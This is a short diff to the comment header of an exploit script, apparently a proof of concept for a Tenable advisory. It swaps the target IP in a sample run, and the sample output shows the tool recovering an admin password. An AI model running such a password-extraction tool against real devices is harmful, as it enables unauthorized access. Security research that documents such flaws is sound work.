@@ -9,7 +9,7 @@
 # Advisory: https://www.tenable.com/security/research/tra-2020-17
 # Sample output:
 # 
-# albinolobster@ubuntu:~$ python3 cti_injection.py --rhost 50.64.173.32 --user admin
+# albinolobster@ubuntu:~$ python3 cti_injection.py --rhost 192.168.0.32 --user admin
 # [+] Reaching out to 192.168.2.1:8888
 # [+] Password length 9
 # [+] The password is LabPass1%
